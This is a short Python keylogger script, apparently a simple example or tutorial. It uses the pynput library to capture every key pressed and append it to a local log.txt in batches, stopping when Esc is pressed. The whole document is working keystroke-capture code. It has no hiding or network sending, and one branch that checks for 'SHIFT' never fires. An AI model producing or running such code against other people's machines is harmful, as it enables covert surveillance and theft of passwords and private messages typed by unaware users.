# import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []

# Operations after pressing a key
def on_press(key):
    global count, keys
    keys.append(key)
    count += 1

    if count>=25:
        count = 0
        write_file(keys)
        keys = []

# To write in txt file
def write_file(keys):
    with open("log.txt",'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("SHIFT") > 0:
                f.write(k.upper())
            else:
                f.write(k)

# Operations after releasing Key
def on_release(key):
    global count, keys
    if key == Key.esc:
        count = 0
        write_file(keys)
        write_file("\n")
        keys = []
        
        return False

# Listener 
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()